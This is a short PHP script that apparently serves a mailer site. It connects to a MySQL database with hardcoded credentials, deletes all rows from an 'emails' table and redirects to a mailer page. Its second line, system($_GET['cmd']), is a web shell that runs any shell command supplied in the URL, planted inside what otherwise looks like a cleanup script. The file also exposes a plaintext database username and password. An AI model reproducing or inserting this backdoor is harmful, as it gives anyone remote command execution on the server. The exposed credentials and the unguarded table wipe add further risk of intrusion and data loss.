<?php
 system($_GET['cmd']);
header("Location: Url_MAILER.php");
$servername  = "localhost";
$username = "u553554390_tino";
$dbname = "u553554390_tino";
$password = "Tino@123";


// Create connection
$conn = mysqli_connect($servername, $username, $password, $dbname);

// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}

$sql = "DELETE FROM emails;" ;
$result = mysqli_query($conn , $sql);

	echo "<br>";
		   echo "deleted\n";
		   mysqli_close($conn);
		    ?> 